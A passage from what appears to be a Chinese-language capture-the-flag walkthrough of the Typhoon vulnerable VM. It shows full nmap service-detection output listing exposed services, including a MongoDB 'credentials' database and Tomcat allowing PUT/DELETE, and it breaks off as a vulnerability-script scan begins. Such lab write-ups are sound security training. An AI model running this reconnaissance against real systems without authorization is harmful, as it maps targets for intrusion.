class="hljs-built_in">df</span>:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)<br>|   2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:<span class="hljs-built_in">dd</span> (RSA)<br>|   256 70:ae:36:6c:42:7d:ed:1b:c0:40:<span class="hljs-built_in">fc</span>:2d:00:8d:87:11 (ECDSA)<br>|_  256 bb:ce:f2:98:64:f7:8f:ae:f0:<span class="hljs-built_in">dd</span>:3c:23:3b:a6:0f:61 (ED25519)<br>25/tcp    open  smtp        Postfix smtpd<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN<br>| ssl-cert: Subject: commonName=typhoon<br>| Not valid before: 2018-10-22T19:38:20<br>|_Not valid after:  2028-10-19T19:38:20<br>53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)<br>| dns-nsid: <br>|_  bind.version: 9.9.5-3-Ubuntu<br>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))<br>|_http-title: Typhoon Vulnerable VM by PRISMA CSI<br>| http-robots.txt: 1 disallowed entry <br>|_/mongoadmin/<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>110/tcp   open  pop3        Dovecot pop3d<br>|_pop3-capabilities: TOP RESP-CODES UIDL SASL STLS PIPELINING CAPA AUTH-RESP-CODE<br>| ssl-cert: Subject: commonName=typhoon/organizationName=Dovecot mail server<br>| Not valid before: 2018-10-22T19:38:49<br>|_Not valid after:  2028-10-21T19:38:49<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>111/tcp   open  rpcbind     2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100003  2,3,4       2049/tcp   nfs<br>|   100003  2,3,4       2049/tcp6  nfs<br>|   100003  2,3,4       2049/udp   nfs<br>|   100003  2,3,4       2049/udp6  nfs<br>|   100005  1,2,3      43189/tcp6  mountd<br>|   100005  1,2,3      47958/udp   mountd<br>|   100005  1,2,3      49357/tcp   mountd<br>|   100005  1,2,3      58024/udp6  mountd<br>|   100021  1,3,4      41979/tcp6  nlockmgr<br>|   100021  1,3,4      43004/tcp   nlockmgr<br>|   100021  1,3,4      56771/udp   nlockmgr<br>|   100021  1,3,4      57546/udp6  nlockmgr<br>|   100024  1          34114/tcp   status<br>|   100024  1          42529/udp6  status<br>|   100024  1          51309/tcp6  status<br>|   100024  1          58257/udp   status<br>|   100227  2,3         2049/tcp   nfs_acl<br>|   100227  2,3         2049/tcp6  nfs_acl<br>|   100227  2,3         2049/udp   nfs_acl<br>|_  100227  2,3         2049/udp6  nfs_acl<br>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp   open  imap        Dovecot imapd (Ubuntu)<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_imap-capabilities: more STARTTLS LITERAL+ IMAP4rev1 post-login have listed LOGIN-REFERRALS OK capabilities Pre-login ENABLE LOGINDISABLEDA0001 IDLE SASL-IR ID<br>| ssl-cert: Subject: commonName=typhoon/organizationName=Dovecot mail server<br>| Not valid before: 2018-10-22T19:38:49<br>|_Not valid after:  2028-10-21T19:38:49<br>445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)<br>631/tcp   open  ipp         CUPS 1.7<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: CUPS/1.7 IPP/2.1<br>| http-methods: <br>|_  Potentially risky methods: PUT<br>|_http-title: Home - CUPS 1.7.2<br>993/tcp   open  ssl/imap    Dovecot imapd (Ubuntu)<br>|_imap-capabilities: more AUTH=PLAINA0001 IMAP4rev1 post-login have listed LOGIN-REFERRALS OK capabilities Pre-login ENABLE ID IDLE SASL-IR LITERAL+<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| ssl-cert: Subject: commonName=typhoon/organizationName=Dovecot mail server<br>| Not valid before: 2018-10-22T19:38:49<br>|_Not valid after:  2028-10-21T19:38:49<br>995/tcp   open  ssl/pop3    Dovecot pop3d<br>| ssl-cert: Subject: commonName=typhoon/organizationName=Dovecot mail server<br>| Not valid before: 2018-10-22T19:38:49<br>|_Not valid after:  2028-10-21T19:38:49<br>|_pop3-capabilities: TOP RESP-CODES UIDL SASL(PLAIN) USER PIPELINING CAPA AUTH-RESP-CODE<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>2049/tcp  open  nfs         2-4 (RPC <span class="hljs-comment">#100003)</span><br>3306/tcp  open  mysql       MySQL (unauthorized)<br>5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5<br>| ssl-cert: Subject: commonName=typhoon<br>| Not valid before: 2018-10-22T19:38:20<br>|_Not valid after:  2028-10-19T19:38:20<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>6379/tcp  open  redis       Redis key-value store 4.0.11<br>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1<br>|_http-open-proxy: Proxy might be redirecting requests<br>| http-methods: <br>|_  Potentially risky methods: PUT DELETE<br>|_http-title: Apache Tomcat<br>|_http-server-header: Apache-Coyote/1.1<br>27017/tcp open  mongodb     MongoDB 3.0.15 3.0.15<br>| mongodb-info: <br>|   MongoDB Build info<br>|     OpenSSLVersion = OpenSSL 1.0.1f 6 Jan 2014<br>|     loaderFlags = <br>|     bits = 64<br>|     ok = 1.0<br>|     versionArray<br>|       3 = 0<br>|       0 = 3<br>|       1 = 0<br>|       2 = 15<br>|     allocator = tcmalloc<br>|     maxBsonObjectSize = 16777216<br>|     compilerFlags = -Wnon-virtual-dtor -Woverloaded-virtual -std=c++11 -fno-omit-frame-pointer -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fno-builtin-memcmp -std=c99<br>|     debug = <span class="hljs-literal">false</span><br>|     javascriptEngine = V8<br>|     version = 3.0.15<br>|     gitVersion = b8ff507269c382bc100fc52f75f48d54cd42ec3b<br>|     sysInfo = Linux ip-10-71-195-23 3.13.0-24-generic <span class="hljs-comment">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49</span><br>|   Server status<br>|     ok = 1.0<br>|     cursors<br>|       timedOut = 0<br>|       totalOpen = 0<br>|       pinned = 0<br>|       totalNoTimeout = 0<br>|       clientCursors_size = 0<br>|       note = deprecated, use server status metrics<br>|     process = mongod<br>|     uptimeMillis = 356783<br>|     extra_info<br>|       heap_usage_bytes = 63081592<br>|       page_faults = 171<br>|       note = fields vary by platform<br>|     globalLock<br>|       activeClients<br>|         writers = 0<br>|         total = 10<br>|         readers = 0<br>|       currentQueue<br>|         writers = 0<br>|         total = 0<br>|         readers = 0<br>|       totalTime = 356773000<br>|     connections<br>|       totalCreated = 4<br>|       available = 51198<br>|       current = 2<br>|     locks<br>|       Database<br>|         acquireCount<br>|           W = 9<br>|           r = 646<br>|           R = 2<br>|       MMAPV1Journal<br>|         acquireCount<br>|           w = 22<br>|           R = 3287<br>|           r = 646<br>|       Global<br>|         timeAcquiringMicros<br>|           r = 1025<br>|         acquireCount<br>|           w = 9<br>|           W = 5<br>|           r = 1310<br>|         acquireWaitCount<br>|           r = 1<br>|       Collection<br>|         acquireCount<br>|           R = 669<br>|     dur<br>|       journaledMB = 0.0<br>|       timeMs<br>|         writeToDataFiles = 0<br>|         prepLogBuffer = 0<br>|         remapPrivateView = 0<br>|         commits = 0<br>|         dt = 3040<br>|         writeToJournal = 0<br>|         commitsInWriteLock = 0<br>|       commits = 28<br>|       compression = 0.0<br>|       writeToDataFilesMB = 0.0<br>|       earlyCommits = 0<br>|       commitsInWriteLock = 0<br>|     writeBacksQueued = <span class="hljs-literal">false</span><br>|     mem<br>|       resident = 67<br>|       supported = <span class="hljs-literal">true</span><br>|       mappedWithJournal = 320<br>|       bits = 64<br>|       virtual = 515<br>|       mapped = 160<br>|     pid = 1312<br>|     uptimeEstimate = 298.0<br>|     metrics<br>|       repl<br>|         apply<br>|           ops = 0<br>|           batches<br>|             totalMillis = 0<br>|             num = 0<br>|         preload<br>|           indexes<br>|             totalMillis = 0<br>|             num = 0<br>|           docs<br>|             totalMillis = 0<br>|             num = 0<br>|         buffer<br>|           count = 0<br>|           sizeBytes = 0<br>|           maxSizeBytes = 268435456<br>|         network<br>|           readersCreated = 0<br>|           ops = 0<br>|           bytes = 0<br>|           getmores<br>|             totalMillis = 0<br>|             num = 0<br>|       cursor<br>|         open<br>|           noTimeout = 0<br>|           total = 0<br>|           pinned = 0<br>|         timedOut = 0<br>|       ttl<br>|         deletedDocuments = 0<br>|         passes = 5<br>|       queryExecutor<br>|         scanned = 0<br>|         scannedObjects = 0<br>|       getLastError<br>|         wtimeouts = 0<br>|         wtime<br>|           totalMillis = 0<br>|           num = 0<br>|       commands<br>|         _isSelf<br>|           failed = 0<br>|           total = 0<br>|         grantRolesToRole<br>|           failed = 0<br>|           total = 0<br>|         findAndModify<br>|           failed = 0<br>|           total = 0<br>|         buildInfo<br>|           failed = 0<br>|           total = 0<br>|         getPrevError<br>|           failed = 0<br>|           total = 0<br>|         copydb<br>|           failed = 0<br>|           total = 0<br>|         copydbsaslstart<br>|           failed = 0<br>|           total = 0<br>|         explain<br>|           failed = 0<br>|           total = 0<br>|         connectionStatus<br>|           failed = 0<br>|           total = 0<br>|         shardingState<br>|           failed = 0<br>|           total = 0<br>|         rolesInfo<br>|           failed = 0<br>|           total = 0<br>|         mergeChunks<br>|           failed = 0<br>|           total = 0<br>|         _getUserCacheGeneration<br>|           failed = 0<br>|           total = 0<br>|         revokeRolesFromUser<br>|           failed = 0<br>|           total = 0<br>|         dropAllUsersFromDatabase<br>|           failed = 0<br>|           total = 0<br>|         applyOps<br>|           failed = 0<br>|           total = 0<br>|         replSetFreeze<br>|           failed = 0<br>|           total = 0<br>|         moveChunk<br>|           failed = 0<br>|           total = 0<br>|         group<br>|           failed = 0<br>|           total = 0<br>|         logRotate<br>|           failed = 0<br>|           total = 0<br>|         currentOpCtx<br>|           failed = 0<br>|           total = 0<br>|         dropUser<br>|           failed = 0<br>|           total = 0<br>|         writebacklisten<br>|           failed = 0<br>|           total = 0<br>|         serverStatus<br>|           failed = 0<br>|           total = 2<br>|         replSetSyncFrom<br>|           failed = 0<br>|           total = 0<br>|         authSchemaUpgrade<br>|           failed = 0<br>|           total = 0<br>|         geoNear<br>|           failed = 0<br>|           total = 0<br>|         insert<br>|           failed = 0<br>|           total = 0<br>|         connPoolStats<br>|           failed = 0<br>|           total = 0<br>|         cloneCollectionAsCapped<br>|           failed = 0<br>|           total = 0<br>|         getParameter<br>|           failed = 0<br>|           total = 0<br>|         saslContinue<br>|           failed = 0<br>|           total = 0<br>|         grantPrivilegesToRole<br>|           failed = 0<br>|           total = 0<br>|         usersInfo<br>|           failed = 0<br>|           total = 0<br>|         forceerror<br>|           failed = 0<br>|           total = 0<br>|         dataSize<br>|           failed = 0<br>|           total = 0<br>|         <span class="hljs-built_in">touch</span><br>|           failed = 0<br>|           total = 0<br>|         replSetInitiate<br>|           failed = 0<br>|           total = 0<br>|         repairDatabase<br>|           failed = 0<br>|           total = 0<br>|         planCacheClear<br>|           failed = 0<br>|           total = 0<br>|         availableQueryOptions<br>|           failed = 0<br>|           total = 0<br>|         repairCursor<br>|           failed = 0<br>|           total = 0<br>|         drop<br>|           failed = 0<br>|           total = 0<br>|         copydbgetnonce<br>|           failed = 0<br>|           total = 0<br>|         replSetUpdatePosition<br>|           failed = 0<br>|           total = 0<br>|         updateRole<br>|           failed = 0<br>|           total = 0<br>|         dropAllRolesFromDatabase<br>|           failed = 0<br>|           total = 0<br>|         appendOplogNote<br>|           failed = 0<br>|           total = 0<br>|         setParameter<br>|           failed = 0<br>|           total = 0<br>|         getShardVersion<br>|           failed = 0<br>|           total = 0<br>|         top<br>|           failed = 0<br>|           total = 0<br>|         setShardVersion<br>|           failed = 0<br>|           total = 0<br>|         dropDatabase<br>|           failed = 0<br>|           total = 0<br>|         updateUser<br>|           failed = 0<br>|           total = 0<br>|         listCollections<br>|           failed = 0<br>|           total = 0<br>|         _recvChunkAbort<br>|           failed = 0<br>|           total = 0<br>|         replSetHeartbeat<br>|           failed = 0<br>|           total = 0<br>|         revokePrivilegesFromRole<br>|           failed = 0<br>|           total = 0<br>|         planCacheSetFilter<br>|           failed = 0<br>|           total = 0<br>|         replSetStepDown<br>|           failed = 0<br>|           total = 0<br>|         getnonce<br>|           failed = 0<br>|           total = 0<br>|         createIndexes<br>|           failed = 0<br>|           total = 0<br>|         getCmdLineOpts<br>|           failed = 0<br>|           total = 0<br>|         planCacheListQueryShapes<br>|           failed = 0<br>|           total = 0<br>|         getLog<br>|           failed = 0<br>|           total = 0<br>|         replSetElect<br>|           failed = 0<br>|           total = 0<br>|         planCacheClearFilters<br>|           failed = 0<br>|           total = 0<br>|         <span class="hljs-built_in">clone</span><br>|           failed = 0<br>|           total = 0<br>|         &lt;UNKNOWN&gt; = 0<br>|         parallelCollectionScan<br>|           failed = 0<br>|           total = 0<br>|         dbStats<br>|           failed = 0<br>|           total = 0<br>|         dropIndexes<br>|           failed = 0<br>|           total = 0<br>|         splitChunk<br>|           failed = 0<br>|           total = 0<br>|         _migrateClone<br>|           failed = 0<br>|           total = 0<br>|         connPoolSync<br>|           failed = 0<br>|           total = 0<br>|         saslStart<br>|           failed = 0<br>|           total = 0<br>|         delete<br>|           failed = 0<br>|           total = 0<br>|         find<br>|           failed = 0<br>|           total = 0<br>|         replSetGetRBID<br>|           failed = 0<br>|           total = 0<br>|         shutdown<br>|           failed = 0<br>|           total = 0<br>|         whatsmyuri<br>|           failed = 0<br>|           total = 0<br>|         ping<br>|           failed = 0<br>|           total = 0<br>|         mapreduce<br>|           shardedfinish<br>|             failed = 0<br>|             total = 0<br>|         handshake<br>|           failed = 0<br>|           total = 0<br>|         invalidateUserCache<br>|           failed = 0<br>|           total = 0<br>|         unsetSharding<br>|           failed = 0<br>|           total = 0<br>|         create<br>|           failed = 0<br>|           total = 0<br>|         <span class="hljs-built_in">logout</span><br>|           failed = 0<br>|           total = 0<br>|         hostInfo<br>|           failed = 0<br>|           total = 0<br>|         count<br>|           failed = 0<br>|           total = 0<br>|         replSetMaintenance<br>|           failed = 0<br>|           total = 0<br>|         reIndex<br>|           failed = 0<br>|           total = 0<br>|         splitVector<br>|           failed = 0<br>|           total = 0<br>|         <span class="hljs-built_in">eval</span><br>|           failed = 0<br>|           total = 0<br>|         update<br>|           failed = 0<br>|           total = 0<br>|         listDatabases<br>|           failed = 0<br>|           total = 1<br>|         planCacheListPlans<br>|           failed = 0<br>|           total = 0<br>|         createRole<br>|           failed = 0<br>|           total = 0<br>|         cursorInfo<br>|           failed = 0<br>|           total = 0<br>|         validate<br>|           failed = 0<br>|           total = 0<br>|         resetError<br>|           failed = 0<br>|           total = 0<br>|         mapReduce<br>|           failed = 0<br>|           total = 0<br>|         isMaster<br>|           failed = 0<br>|           total = 0<br>|         listCommands<br>|           failed = 0<br>|           total = 0<br>|         _transferMods<br>|           failed = 0<br>|           total = 0<br>|         filemd5<br>|           failed = 0<br>|           total = 0<br>|         profile<br>|           failed = 0<br>|           total = 0<br>|         replSetGetConfig<br>|           failed = 0<br>|           total = 0<br>|         createUser<br>|           failed = 0<br>|           total = 0<br>|         collMod<br>|           failed = 0<br>|           total = 0<br>|         diagLogging<br>|           failed = 0<br>|           total = 0<br>|         medianKey<br>|           failed = 0<br>|           total = 0<br>|         dbHash<br>|           failed = 0<br>|           total = 0<br>|         driverOIDTest<br>|           failed = 0<br>|           total = 0<br>|         replSetReconfig<br>|           failed = 0<br>|           total = 0<br>|         _recvChunkStatus<br>|           failed = 0<br>|           total = 0<br>|         checkShardingIndex<br>|           failed = 0<br>|           total = 0<br>|         aggregate<br>|           failed = 0<br>|           total = 0<br>|         _recvChunkCommit<br>|           failed = 0<br>|           total = 0<br>|         cleanupOrphaned<br>|           failed = 0<br>|           total = 0<br>|         grantRolesToUser<br>|           failed = 0<br>|           total = 0<br>|         revokeRolesFromRole<br>|           failed = 0<br>|           total = 0<br>|         geoSearch<br>|           failed = 0<br>|           total = 0<br>|         getShardMap<br>|           failed = 0<br>|           total = 0<br>|         _recvChunkStart<br>|           failed = 0<br>|           total = 0<br>|         resync<br>|           failed = 0<br>|           total = 0<br>|         getLastError<br>|           failed = 0<br>|           total = 0<br>|         cloneCollection<br>|           failed = 0<br>|           total = 0<br>|         replSetGetStatus<br>|           failed = 0<br>|           total = 0<br>|         planCacheListFilters<br>|           failed = 0<br>|           total = 0<br>|         _mergeAuthzCollections<br>|           failed = 0<br>|           total = 0<br>|         listIndexes<br>|           failed = 0<br>|           total = 0<br>|         authenticate<br>|           failed = 0<br>|           total = 0<br>|         features<br>|           failed = 0<br>|           total = 0<br>|         shardConnPoolStats<br>|           failed = 0<br>|           total = 0<br>|         compact<br>|           failed = 0<br>|           total = 0<br>|         fsync<br>|           failed = 0<br>|           total = 0<br>|         collStats<br>|           failed = 0<br>|           total = 0<br>|         convertToCapped<br>|           failed = 0<br>|           total = 0<br>|         renameCollection<br>|           failed = 0<br>|           total = 0<br>|         distinct<br>|           failed = 0<br>|           total = 0<br>|         replSetFresh<br>|           failed = 0<br>|           total = 0<br>|         dropRole<br>|           failed = 0<br>|           total = 0<br>|       operation<br>|         fastmod = 0<br>|         writeConflicts = 0<br>|         idhack = 0<br>|         scanAndOrder = 0<br>|       record<br>|         moves = 0<br>|       storage<br>|         freelist<br>|           search<br>|             requests = 0<br>|             scanned = 0<br>|             bucketExhausted = 0<br>|       document<br>|         deleted = 0<br>|         inserted = 0<br>|         returned = 0<br>|         updated = 0<br>|     network<br>|       numRequests = 2<br>|       bytesOut = 10166<br>|       bytesIn = 128<br>|     opcountersRepl<br>|       <span class="hljs-built_in">command</span> = 0<br>|       insert = 0<br>|       update = 0<br>|       query = 0<br>|       delete = 0<br>|       getmore = 0<br>|     backgroundFlushing<br>|       last_ms = 0<br>|       last_finished = 1688255256082<br>|       flushes = 5<br>|       total_ms = 1<br>|       average_ms = 0.2<br>|     host = typhoon.local<br>|     opcounters<br>|       <span class="hljs-built_in">command</span> = 3<br>|       insert = 0<br>|       update = 0<br>|       query = 1<br>|       delete = 0<br>|       getmore = 0<br>|     <span class="hljs-built_in">uptime</span> = 357.0<br>|     storageEngine<br>|       name = mmapv1<br>|     version = 3.0.15<br>|     asserts<br>|       msg = 0<br>|       regular = 0<br>|       warning = 0<br>|       rollovers = 0<br>|       user = 0<br>|_    localTime = 1688255312772<br>| mongodb-databases: <br>|   ok = 1.0<br>|   totalSize = 167772160.0<br>|   databases<br>|     1<br>|       name = <span class="hljs-built_in">local</span><br>|       empty = <span class="hljs-literal">false</span><br>|       sizeOnDisk = 83886080.0<br>|     0<br>|       name = credentials<br>|       empty = <span class="hljs-literal">false</span><br>|_      sizeOnDisk = 83886080.0<br>34114/tcp open  status      1 (RPC <span class="hljs-comment">#100024)</span><br>34329/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>41559/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>43004/tcp open  nlockmgr    1-4 (RPC <span class="hljs-comment">#100021)</span><br>49357/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>MAC Address: 08:00:27:2D:C0:8F (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Hosts:  typhoon, TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>| smb2-security-mode: <br>|   3:0:0: <br>|_    Message signing enabled but not required<br>|_nbstat: NetBIOS name: TYPHOON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-07-01T23:48:32<br>|_  start_date: N/A<br>|_clock-skew: mean: 6h59m55s, deviation: 1h43m55s, median: 7h59m54s<br>| smb-os-discovery: <br>|   OS: Unix (Samba 4.1.6-Ubuntu)<br>|   Computer name: typhoon<br>|   NetBIOS computer name: TYPHOON\x00<br>|   Domain name: <span class="hljs-built_in">local</span><br>|   FQDN: typhoon.local<br>|_  System time: 2023-07-02T02:48:32+03:00<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 29.81 seconds<br></code></pre></td></tr></table></figure>
+
+<p>emmm，信息好多啊，把漏洞脚本扫描一起做了，再进行分析吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p21,22,25,53,80,110,111,139,143,445,631,993,995,2049,3306,5432,6379,8080,27017,34114,34329,41559,43004,49357 192.168.56.121<br><br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 01:56 EDT<br>Nmap scan report <span 